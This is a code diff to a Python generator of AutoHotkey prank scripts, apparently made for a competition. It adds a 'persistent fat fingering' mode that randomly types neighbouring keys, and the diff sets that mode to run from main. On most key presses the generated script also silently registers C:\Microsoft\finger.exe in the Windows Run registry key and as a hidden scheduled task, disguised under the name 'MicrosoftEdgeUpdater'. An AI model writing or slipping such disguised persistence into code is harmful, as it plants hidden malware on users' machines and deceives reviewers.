@@ -113,6 +113,131 @@ $Right::{
     with open("output.txt", "w") as file:
         file.write(result + "^Esc::ExitApp\n")
 
+def persistent_fat_fingering():
+    neighbors = {
+        'q': ['w', 'a'],
+        'w': ['q', 'a', 's', 'e'],
+        'e': ['w', 's', 'd', 'r'],
+        'r': ['e', 'd', 'f', 't'],
+        't': ['r', 'f', 'g', 'y'],
+        'y': ['t', 'g', 'h', 'u'],
+        'u': ['y', 'h', 'j', 'i'],
+        'i': ['u', 'j', 'k', 'o'],
+        'o': ['i', 'k', 'l', 'p'],
+        'p': ['o', 'l'],
+
+        'a': ['q', 'w', 's', 'z'],
+        's': ['a', 'w', 'e', 'd', 'x', 'z'],
+        'd': ['s', 'e', 'r', 'f', 'c', 'x'],
+        'f': ['d', 'r', 't', 'g', 'v', 'c'],
+        'g': ['f', 't', 'y', 'h', 'b', 'v'],
+        'h': ['g', 'y', 'u', 'j', 'n', 'b'],
+        'j': ['h', 'u', 'i', 'k', 'n', 'm'],
+        'k': ['j', 'i', 'o', 'l', 'm'],
+        'l': ['k', 'o', 'p'],
+
+        'z': ['a', 's', 'x'],
+        'x': ['z', 's', 'd', 'c'],
+        'c': ['x', 'd', 'f', 'v'],
+        'v': ['c', 'f', 'g', 'b'],
+        'b': ['v', 'g', 'h', 'n'],
+        'n': ['b', 'h', 'j', 'm'],
+        'm': ['n', 'j', 'k']
+    }
+
+    result = '''#SingleInstance Force
+
+global odds1 := 1
+global odds2 := 10
+
+konami(char) {
+    static current := 0
+    if (char = "Up" && current = 0) {
+        current := 1
+    } else if (char = "Up" && current = 1) {
+        current := 2
+    } else if (char = "Down" && current = 2) {
+        current := 3
+    } else if (char = "Down" && current = 3) {
+        current := 4
+    } else if (char = "Left" && current = 4) {
+        current := 5
+    } else if (char = "Right" && current = 5) {
+        current := 6
+    } else if (char = "Left" && current = 6) {
+        current := 7
+    } else if (char = "Right" && current = 7) {
+        current := 8
+    } else if (char = "b" && current = 8) {
+        current := 9
+    } else if (char = "a" && current = 9) {
+        MsgBox("Now why would I have left this in for a comp?")
+    } else {
+        current := 0
+    }
+}
+
+'''
+
+    for key in neighbors:
+        adjacent = neighbors[key]
+        result += "$" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
+        result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
+        first = True
+        for i in range(len(adjacent)):
+            if not first:
+                result += ' else '
+            else:
+                first = False
+            result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "' + key + adjacent[i] + '"\n\t\t}'
+        result += '\n\t} else {\n\t\tSend "' + key + '"\n\t}'
+        result += '\n\t' + r'''RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"'''
+        result += '\n\t' + r'''Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"'''
+        result += '\n\tkonami("' + key + '")'
+        result += '\n}\n'
+
+        result += "$+" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
+        result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
+        first = True
+        for i in range(len(adjacent)):
+            if not first:
+                result += ' else '
+            else:
+                first = False
+            result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "+' + key + "+" + adjacent[i] + '"\n\t\t}'
+        result += '\n\t} else {\n\t\tSend "+' + key + '"\n\t}'
+        result += '\n\tkonami("' + key + '")'
+        result += '\n}\n'
+
+    result += r'''$Up::{
+    Send "{Up}"
+    konami("Up")
+    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+}
+$Down::{
+    Send "{Down}"
+    konami("Down")
+    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+}
+$Left::{
+    Send "{Left}"
+    konami("Left")
+    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+}
+$Right::{
+    Send "{Right}"
+    konami("Right")
+    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
+}
+'''
+
+    with open("output.txt", "w") as file:
+        file.write(result + "^Esc::ExitApp\n")
+
 def shift_keyboard_right_one():
     letters = [
         'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
@@ -545,6 +670,7 @@ def tool():
 
 if __name__ == "__main__":
     # fat_fingering()
+    persistent_fat_fingering()
     # shift_keyboard_right_one()
     # type_backwards()
     # autocorrect()
